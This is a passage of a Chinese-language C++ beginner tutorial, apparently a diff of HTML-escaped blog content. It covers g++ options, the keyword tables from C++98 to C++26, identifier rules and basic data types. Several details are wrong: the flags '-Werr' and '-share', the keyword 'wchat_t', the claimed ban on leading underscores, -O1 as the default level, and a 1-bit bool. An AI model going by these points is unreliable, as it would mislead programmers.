+&lt;p&gt;&lt;code&gt;C++&lt;/code&gt;本身只是一个标准，不同硬件平台可以提供自己的编译器以便编译出可以在自己平台上运行的程序，一些组织也开发了比较通用的&lt;code&gt;C++&lt;/code&gt;编译器，如&lt;code&gt;g++&lt;/code&gt;，&lt;code&gt;Clang&lt;/code&gt;，&lt;code&gt;MSVC&lt;/code&gt;等。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;(类)Unix&lt;/code&gt;平台通常使用&lt;code&gt;g++&lt;/code&gt;，&lt;code&gt;Windows&lt;/code&gt;平台下可通过安装&lt;code&gt;Microsoft Visual Studio&lt;/code&gt;使用&lt;code&gt;MSVC&lt;/code&gt;，或者使用针对&lt;code&gt;Windows&lt;/code&gt;平台构建的&lt;code&gt;GUN&lt;/code&gt;软件包（如&lt;code&gt;MinGW&lt;/code&gt;）中的&lt;code&gt;g++&lt;/code&gt;。&lt;/p&gt;
+&lt;h3&gt;1.4. g++编译C++程序的流程&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;1.5. g++编译器使用&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;Linux&lt;/code&gt;直接使用包管理器安装&lt;code&gt;gcc&lt;/code&gt;和&lt;code&gt;g++&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Windows&lt;/code&gt;安装&lt;code&gt;MinGW&lt;/code&gt;软件包，常用&lt;code&gt;MinGW-W64&lt;/code&gt;，可直接从&lt;code&gt;GitHub&lt;/code&gt;下载预构建版本，安装完成后手动将安装目录下的&lt;code&gt;bin&lt;/code&gt;目录添加到系统&lt;code&gt;path&lt;/code&gt;环境变量中。&lt;/p&gt;
+&lt;p&gt;::github{repo=&quot;niXman/mingw-builds-binaries&quot;}&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;基本应用&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;g++ t.cpp
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;默认输出&lt;code&gt;a.out&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;g++&lt;/code&gt;默认通过扩展名判断编程语言，需要注意源文件拓展名&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;更改输出文件名&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;g++ -o t t.cpp
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;多个输入&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;g++ -o t t1.cpp t2.cpp t1.h t2.h t3.o
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;注意，输出为可执行程序时，所有输入（包括目标文件）中必须包含且只包含一个&lt;code&gt;main&lt;/code&gt;函数&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;只预处理文件&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;g++ -E t.cpp
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;直接输出到标准输出，需要保存的请手动重定向&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;只编译代码，不进行汇编&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;g++ -S t.cpp
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;输出汇编代码到&lt;code&gt;*.s&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;输出目标代码，暂不连接&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;g++ -c t.cpp
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;输出目标代码&lt;code&gt;*.o&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;目标代码可以在编译时直接作为输入使用，见“多个输入”的示例&lt;/p&gt;
+&lt;p&gt;大型工程往往在编译时分出很多目标代码，当某个模块更改时，只用重新编译对应的目标文件，然后重新链接一次，可以大大减少编译时长&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;包含库&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;g++ -o t t.cpp -llibrary
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;额外包含库，&lt;code&gt;l&lt;/code&gt;后面直接加库名称，无空格&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;g++ -o t t.cpp -Ldir
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;额外包含库搜索目录，&lt;code&gt;L&lt;/code&gt;后面直接加目录名称，无空格&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;包含头文件&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;g++ -o t t.cpp -IDIR
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;包含额外头文件搜索目录，指尖括号内系统头文件的搜索路径&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;调试选项&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;g++ -o t -g t.cpp
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;输出包含调试信息的程序，调试信息包含变量名，源代码等，使用&lt;code&gt;gdb&lt;/code&gt;调试器时必须开启该选项&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;编译优化&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;g++ -o t t.cpp -Ox
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;x&lt;/code&gt;可选&lt;code&gt;0,1,2,3&lt;/code&gt;，&lt;code&gt;0&lt;/code&gt;表示关闭编译优化，&lt;code&gt;1&lt;/code&gt;为默认等级，&lt;code&gt;3&lt;/code&gt;为最高等级&lt;/p&gt;
+&lt;p&gt;在调试时常关闭优化以保证生成的程序与源文件相同，生成发布版本时开启最高等级以保证运行速度&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;警告输出&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;g++ -o t t.cpp -Wall
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;输出所有警告&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;g++ -o t t.cpp -Werr
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;把警告视为错误，遇到警告会终止编译&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;g++ -o t t.cpp -w
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;忽略所有警告，在编译大型项目时用来快速定位错误&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;动态库选项&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;g++ -o t t.cpp -static
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;禁止使用动态库，编译后的程序比较大，但不需要动态库就可以运行&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;g++ -o t t.cpp -share
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;尽可能使用动态库，编译后的程序较小，且需要系统的动态库才可以运行&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;语言标准&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;g++ -o t t.cpp -std=c++17
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;2. 关键字与标识符&lt;/h2&gt;
+&lt;h3&gt;2.1. 关键字&lt;/h3&gt;
+&lt;p&gt;关键字是计算机语言中的词汇，这些词有特殊的意义，不能用作他用。&lt;/p&gt;
+&lt;p&gt;各标准中出现的&lt;code&gt;C++&lt;/code&gt;关键字如下&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;C++98&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;and&lt;/td&gt;
+&lt;td&gt;and_eq&lt;/td&gt;
+&lt;td&gt;asm&lt;/td&gt;
+&lt;td&gt;auto&lt;/td&gt;
+&lt;td&gt;bitand&lt;/td&gt;
+&lt;td&gt;bitor&lt;/td&gt;
+&lt;td&gt;bool&lt;/td&gt;
+&lt;td&gt;break&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;case&lt;/td&gt;
+&lt;td&gt;catch&lt;/td&gt;
+&lt;td&gt;char&lt;/td&gt;
+&lt;td&gt;class&lt;/td&gt;
+&lt;td&gt;compl&lt;/td&gt;
+&lt;td&gt;const&lt;/td&gt;
+&lt;td&gt;const_cast&lt;/td&gt;
+&lt;td&gt;continue&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;default&lt;/td&gt;
+&lt;td&gt;delete&lt;/td&gt;
+&lt;td&gt;do&lt;/td&gt;
+&lt;td&gt;double&lt;/td&gt;
+&lt;td&gt;dynamic_cast&lt;/td&gt;
+&lt;td&gt;else&lt;/td&gt;
+&lt;td&gt;enum&lt;/td&gt;
+&lt;td&gt;explicit&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;export&lt;/td&gt;
+&lt;td&gt;extern&lt;/td&gt;
+&lt;td&gt;false&lt;/td&gt;
+&lt;td&gt;float&lt;/td&gt;
+&lt;td&gt;for&lt;/td&gt;
+&lt;td&gt;friend&lt;/td&gt;
+&lt;td&gt;goto&lt;/td&gt;
+&lt;td&gt;if&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;inline&lt;/td&gt;
+&lt;td&gt;int&lt;/td&gt;
+&lt;td&gt;long&lt;/td&gt;
+&lt;td&gt;mutable&lt;/td&gt;
+&lt;td&gt;namespace&lt;/td&gt;
+&lt;td&gt;new&lt;/td&gt;
+&lt;td&gt;not&lt;/td&gt;
+&lt;td&gt;not_eq&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;private&lt;/td&gt;
+&lt;td&gt;protected&lt;/td&gt;
+&lt;td&gt;public&lt;/td&gt;
+&lt;td&gt;register&lt;/td&gt;
+&lt;td&gt;reinterpret_cast&lt;/td&gt;
+&lt;td&gt;return&lt;/td&gt;
+&lt;td&gt;short&lt;/td&gt;
+&lt;td&gt;signed&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;sizeof&lt;/td&gt;
+&lt;td&gt;static&lt;/td&gt;
+&lt;td&gt;static_cast&lt;/td&gt;
+&lt;td&gt;struct&lt;/td&gt;
+&lt;td&gt;switch&lt;/td&gt;
+&lt;td&gt;template&lt;/td&gt;
+&lt;td&gt;this&lt;/td&gt;
+&lt;td&gt;throw&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;true&lt;/td&gt;
+&lt;td&gt;try&lt;/td&gt;
+&lt;td&gt;typedef&lt;/td&gt;
+&lt;td&gt;typeid&lt;/td&gt;
+&lt;td&gt;typename&lt;/td&gt;
+&lt;td&gt;union&lt;/td&gt;
+&lt;td&gt;unsigned&lt;/td&gt;
+&lt;td&gt;using&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;virtual&lt;/td&gt;
+&lt;td&gt;void&lt;/td&gt;
+&lt;td&gt;volatile&lt;/td&gt;
+&lt;td&gt;wchat_t&lt;/td&gt;
+&lt;td&gt;while&lt;/td&gt;
+&lt;td&gt;xor&lt;/td&gt;
+&lt;td&gt;xor_eq&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;C++11&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;alignas&lt;/td&gt;
+&lt;td&gt;alignof&lt;/td&gt;
+&lt;td&gt;char16_t&lt;/td&gt;
+&lt;td&gt;char32_t&lt;/td&gt;
+&lt;td&gt;constexpr&lt;/td&gt;
+&lt;td&gt;decltype&lt;/td&gt;
+&lt;td&gt;noexcept&lt;/td&gt;
+&lt;td&gt;nullptr&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;static_assert&lt;/td&gt;
+&lt;td&gt;thread_local&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;C++20&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;char8_t&lt;/td&gt;
+&lt;td&gt;concept&lt;/td&gt;
+&lt;td&gt;consteval&lt;/td&gt;
+&lt;td&gt;constinit&lt;/td&gt;
+&lt;td&gt;co_await&lt;/td&gt;
+&lt;td&gt;co_return&lt;/td&gt;
+&lt;td&gt;co_yield&lt;/td&gt;
+&lt;td&gt;requires&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;C++26&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;contract_assert&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;TM TS/reflection TS&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;atomic_cancel&lt;/td&gt;
+&lt;td&gt;atomic_commit&lt;/td&gt;
+&lt;td&gt;atomic_noexcept&lt;/td&gt;
+&lt;td&gt;reflexpr&lt;/td&gt;
+&lt;td&gt;synchronized&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;:::note&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;TM TS&lt;/code&gt;和&lt;code&gt;reflection TS&lt;/code&gt;是非&lt;code&gt;ISO C++&lt;/code&gt;的&lt;code&gt;C++&lt;/code&gt;标准，各编译器支持程度不同&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;p&gt;:::note&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;C++&lt;/code&gt;关键字中有一部分是为了替代特殊符号的运算符而出现的标记符号，功能与运算符完全相同，如下表&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;标记&lt;/th&gt;
+&lt;th&gt;含义&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;and&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;and_eq&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;amp;=&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;bitand&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;amp;&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;bitor&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;`&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;compl&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;~&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;not&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;!&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;not_eq&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;!=&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;or&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;`&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;or_eq&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;`&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;xor&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;^&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;xor_eq&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;^=&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;h3&gt;2.2. 标识符&lt;/h3&gt;
+&lt;p&gt;标识符是用来标记变量，函数名等的符号，通俗讲就是各种“名字”&lt;/p&gt;
+&lt;p&gt;符合以下规则的是&lt;code&gt;C++&lt;/code&gt;中的合法标识符&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;只包含大写字母、小写字母（区分大小写）、数字和下划线&lt;/li&gt;
+&lt;li&gt;不能以下划线开头&lt;/li&gt;
+&lt;li&gt;不能是&lt;code&gt;C++&lt;/code&gt;的关键字&lt;/li&gt;
+&lt;li&gt;理论上没有长度限制，但不同编译器可能会存在长度限制&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;:::note&lt;/p&gt;
+&lt;p&gt;由下划线开头的标识符往往是系统使用的，不建议使用下划线开头的标识符&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;p&gt;虽然满足上述要求就是合法的标识符，但是不同标识符往往会遵守一些约定俗成的编码规范/命名方案以便于阅读。&lt;/p&gt;
+&lt;h2&gt;3. 基本数据类型&lt;/h2&gt;
+&lt;h3&gt;3.1. 整型&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;char&lt;/code&gt;：1字节&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;short&lt;/code&gt;：至少16位，通常是16位&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;int&lt;/code&gt;：至少与&lt;code&gt;short&lt;/code&gt;一样长，通常是32位&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;long&lt;/code&gt;：至少32位，且至少与&lt;code&gt;int&lt;/code&gt;一样长，通常是32位&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;long long&lt;/code&gt;：至少64位，且至少与&lt;code&gt;long&lt;/code&gt;一样长，通常是64位&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;:::note&lt;/p&gt;
+&lt;p&gt;计算机中有符号数常采用补码表示法&lt;/p&gt;
+&lt;p&gt;正数首位为0，负数首位为1，对于$N$位的补码$-a(0 &amp;lt; a &amp;lt; 2^{N-1})$，其原码表示的数字就是$2^N-a$，这样以来，我们可以轻松处理在0附近从正数减到负数时的退位溢出问题而不用额外考虑复杂的符号变换，同时正数也能兼容无符号数&lt;/p&gt;
+&lt;p&gt;另一方面，符号不同的补码也可以直接相加，即$a+(-b)=a+(2^N-b)=a-b$，计算机内部计算减法时也可以直接将其转化成负数然后计算，非常易用&lt;/p&gt;
+&lt;p&gt;当对补码取相反数时，只需将原码按位取反再加1即可&lt;/p&gt;
+&lt;p&gt;这样一来，原数字变成相反数的过程中，低位的0全部变成1，加上1后一直进位，直到遇见1（取反后是0），那么互为相反数的补码就只有最低位到第一个1的位置是一样的，高位都互为相反数，我们把这个相同的数字叫&lt;code&gt;lowbits&lt;/code&gt;，即&lt;code&gt;lowbits=a&amp;amp;(-a)&lt;/code&gt;，数学上是该数字最大的2的幂因子，这个技巧在一些算法中非常有用&lt;/p&gt;
+&lt;p&gt;根据上面分析不难看出，$N$位补码可表示的范围就是$-2^{N-1} \sim 2^{N-1}-1$，$2^{N-1}-1$上溢后会变成$-2^{N-1}$，反之$-2^{N-1}$下溢就是$2^{N-1}-1$&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;p&gt;:::tip&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;char&lt;/code&gt;是用来存储字符的数据类型，但也常会被用作存储较小的数字&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;char&lt;/code&gt;用来存储&lt;code&gt;ASCII&lt;/code&gt;字符时，其数字就是字符对应的&lt;code&gt;ASCII&lt;/code&gt;编码&lt;/p&gt;
+&lt;p&gt;当&lt;code&gt;char&lt;/code&gt;用来存储&lt;code&gt;Uincode&lt;/code&gt;字符时，负数表示该字节与后面的字节构成完整字符，该字节没有达到字符编码的末尾&lt;/p&gt;
+&lt;p&gt;存储&lt;code&gt;Unicode&lt;/code&gt;字符还会使用&lt;code&gt;wchar_t&lt;/code&gt;（一般为&lt;code&gt;short&lt;/code&gt;，因编译器而异）和&lt;code&gt;C++11&lt;/code&gt;新增的&lt;code&gt;char16_t&lt;/code&gt;和&lt;code&gt;char32_t&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;h3&gt;3.2. 无符号整型&lt;/h3&gt;
+&lt;p&gt;在上面的有符号整型前加上&lt;code&gt;unsigned&lt;/code&gt;即为对应的无符号类型&lt;/p&gt;
+&lt;p&gt;$N$位无符号数的范围即为$0\sim 2^N-1$&lt;/p&gt;
+&lt;p&gt;实际上，&lt;code&gt;unsigned&lt;/code&gt;是&lt;code&gt;unsigned int&lt;/code&gt;的简写，同理，&lt;code&gt;signed&lt;/code&gt;也是&lt;code&gt;signed int&lt;/code&gt;的简称，而&lt;code&gt;short&lt;/code&gt;，&lt;code&gt;int&lt;/code&gt;，&lt;code&gt;long&lt;/code&gt;，&lt;code&gt;long long&lt;/code&gt;实际上是&lt;code&gt;signed short&lt;/code&gt;，&lt;code&gt;signed int&lt;/code&gt;，&lt;code&gt;signed long&lt;/code&gt;，&lt;code&gt;signed long long&lt;/code&gt;的简写&lt;/p&gt;
+&lt;h4&gt;整型书写方法&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;十进制数：直接书写，无前导0&lt;/li&gt;
+&lt;li&gt;八进制数：含前导0&lt;/li&gt;
+&lt;li&gt;十六进制数：含前导0x&lt;/li&gt;
+&lt;li&gt;不带任何后缀的数字会被存储为&lt;code&gt;int&lt;/code&gt;，超过&lt;code&gt;int&lt;/code&gt;范围的会被依次存储为&lt;code&gt;long&lt;/code&gt;，&lt;code&gt;long long&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;带后缀&lt;code&gt;l/L&lt;/code&gt;，&lt;code&gt;ll/LL&lt;/code&gt;会分别被存储为&lt;code&gt;long&lt;/code&gt;，&lt;code&gt;long long&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;带后缀&lt;code&gt;u/U&lt;/code&gt;，&lt;code&gt;ul/UL&lt;/code&gt;，&lt;code&gt;ull/ULL&lt;/code&gt;会分别被存储为&lt;code&gt;unsigned int&lt;/code&gt;，&lt;code&gt;unsigned long&lt;/code&gt;，&lt;code&gt;unsigned long long&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;单个字符使用单引号括起来表示&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;3.3. 浮点数&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;float&lt;/code&gt;：至少32位，通常是32位&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;double&lt;/code&gt;：至少是48位，通常是64位&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;long double&lt;/code&gt;：至少和&lt;code&gt;double&lt;/code&gt;一样长，通常是128位&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;:::note&lt;/p&gt;
+&lt;p&gt;计算机中的小数通常采用浮点表示法，故称为浮点数，数据分为符号位、有效数和指数，浮点数的实际值表示为$(-1)^S\times A\times 2^N$（$S$为符号位，$A$为有效数，$N$为指数），指数按照偏移量的方式处理负数，不同长度的浮点数有不同的分配方式，详见&lt;a href=&quot;https://standards.ieee.org/ieee/754/6210/&quot;&gt;IEEE 754&lt;/a&gt;标准&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;h4&gt;浮点数表示法&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;直接表示&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;E表示法&lt;/p&gt;
+&lt;p&gt;用&lt;code&gt;E&lt;/code&gt;或&lt;code&gt;e&lt;/code&gt;加上数字表示小数点移动（十进制），如&lt;code&gt;1e2&lt;/code&gt;表示&lt;code&gt;100&lt;/code&gt;，&lt;code&gt;2.5E-2&lt;/code&gt;表示&lt;code&gt;0.025&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;不带任何后缀的浮点数会被存储为&lt;code&gt;double&lt;/code&gt;类型&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;带后缀&lt;code&gt;f/F&lt;/code&gt;会被存储为&lt;code&gt;float&lt;/code&gt;类型&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;带后缀&lt;code&gt;l/L&lt;/code&gt;会被存储为&lt;code&gt;long double&lt;/code&gt;类型&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;:::important&lt;/p&gt;
+&lt;p&gt;浮点数精度有限，在要求精度较高时会使用整数和固定的指数代替浮点数&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;h3&gt;3.4. 布尔型&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;bool&lt;/code&gt;：1位，表示&lt;code&gt;true(1)&lt;/code&gt;或&lt;code&gt;false(0)&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;:::tip&lt;/p&gt;
+&lt;p&gt;对于当前使用的编译器，各种数据类型的最大最小值都作为常量被包含在&lt;code&gt;climits&lt;/code&gt;头文件中，主要有以下值&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;CHAR_BIT&lt;/td&gt;
+&lt;td&gt;CHAR_MAX&lt;/td&gt;
+&lt;td&gt;CHAR_MIN&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;SCHAR_MAX&lt;/td&gt;
+&lt;td&gt;SCHAR_MIN&lt;/td&gt;
+&lt;td&gt;UCHAR_MAX&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;SHRT_MAX&lt;/td&gt;
